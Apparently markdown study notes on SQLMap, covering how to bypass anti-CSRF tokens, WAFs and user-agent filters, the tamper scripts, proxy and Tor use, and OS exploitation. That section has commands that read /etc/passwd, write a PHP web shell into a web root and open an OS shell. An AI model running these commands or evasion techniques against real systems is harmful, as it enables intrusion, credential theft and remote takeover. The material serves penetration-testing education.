## Anti-CSRF Token Bypass

The `--csrf-token` option can be used to bypass Anti-CSRF protection.
We can specify this option and the key-name of the CSRF token in the request, and SQLMap will automatically parse it.

Additionally, even if we didn't specify the name, SQLMap will automatically search for known names for CSRF tokens (i.e. `csrf`, `xsrf`, `token`), also the user will be prompted if he wants the token to be automatically updated in further requests:

```sh
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

## Unique Value Bypass

In some cases, web applications may require a unique value to be provided inside predefined parameters.

For this case, the option `--randomize` should be used, pointing to the parameter name containing a value which should be randomized before being sent:

```sh
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5
```

## Calculated Parameter Bypass

Some web applications require a parameter's value to be a calculated result for another parameter.
A common example is requiring a hash like `h=MD5(id)` this breaks automation because the hash must be recalculated for every new `id` value tested.

**How SQLMap fixes this?**
	By using the `--eval` option which takes a string of Python code, and before sending the  request, SQLMap executes this code to dynamically calculate and update the necessary parameter value

```sh
sqlmap -u "http://.../?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
```

## IP Address Concealing

If for some reason we wanted to change our IP or use a Proxy before sending the request, we can use the option `--proxy` (e.g. `--proxy="socks4://177.39.187.70:33283"`) where we should add a working proxy.

In addition to that if we have a list of proxies, we can provide them to SQLMap with the option 
`--proxy-file`

```ad-info
When properly installed on local machine, there should be a `SOCKS4` proxy service on port 9050 or 9150. By using the option `--tor` SQLMap will try to find the local port and use it.

---

If we wanted to make sure that Tor is properly being used and prevent unwanted behaviour, we could use the `--check-tor` option.
```

## WAF Bypass

SQLMap sends a malicious-looking request to the web server to check if there is any response from a WAF and then try to identify that WAF using a third-party library called **IdentYwaf** containing the signatures of +80 different WAS solutions.

We can use `--skip-waf` option to skip this operation.

## User-agent Blacklisting Bypass

SQLMap uses the following `User-Agent` header:

`User-agent: sqlmap/1.4.9 (http://sqlmap.org)`

The trivial bypass is to use the option `--random-agent` which changes the default user-agent with a randomly chosen value from a large pool of values.

## Tamper Scripts

| **Tamper-Script**           | **Description**                                                                                                                  |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `0eunion`                   | Replaces instances of UNION with e0UNION                                                                                         |
| `base64encode`              | Base64-encodes all characters in a given payload                                                                                 |
| `between`                   | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`                 |
| `commalesslimit`            | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart                                                 |
| `equaltolike`               | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart                                                         |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword                                                                               |
| `modsecurityversioned`      | Embraces complete query with (MySQL) versioned comment                                                                           |
| `modsecurityzeroversioned`  | Embraces complete query with (MySQL) zero-versioned comment                                                                      |
| `percentage`                | Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                            |
| `plus2concat`               | Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart                                                          |
| `randomcase`                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                                   |
| `space2comment`             | Replaces space character ( ) with comments `/                                                                                    |
| `space2dash`                | Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)                        |
| `space2hash`                | Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`) |
| `space2mssqlblank`          | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters         |
| `space2plus`                | Replaces space character ( ) with plus (`+`)                                                                                     |
| `space2randomblank`         | Replaces space character ( ) with a random blank character from a valid set of alternate characters                              |
| `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)                                           |
| `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                                |
| `versionedmorekeywords`     | Encloses each keyword with (MySQL) versioned comment                                                                             |

To get the whole list, the option `--list-tampers` can be used.

## Miscellaneous Bypasses

### Chunked

We can use **Chunked** transfer encoding, turned on using `--chunked`, which splits the POST request's body into so-called "chunks".

---

# OS Exploitation

SQLMap has the ability to utilize SQLi vulnerabilities to read and write files from the local system outside the DBMS. SQLMap can also attempt to give us direct command execution on the remote host if we had the proper privileges.

## File Read/Write

In MySQL, to read local files, the DB user must have the privilege to **LOAD DATA** and **INSERT** to be able to load the content of a file to a table and then reading that table.

**Example:** 

```sql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
```

## Checking for DBA Privileges

To check if we have **dba** privileges  with SQLMap, we can use the option `--is-dba`:

```sh
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

## Reading Local Files

We can use the `--file-read` option to read local files:

```sh
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

## Writing Local Files

We can use the options `--file-write` and `--file-dest` to write a local file into the target webserver:

```sh
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

## OS Command Execution

To try and get OS shell with SQLMap, we can use the option `--os-shell`:

```sh
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

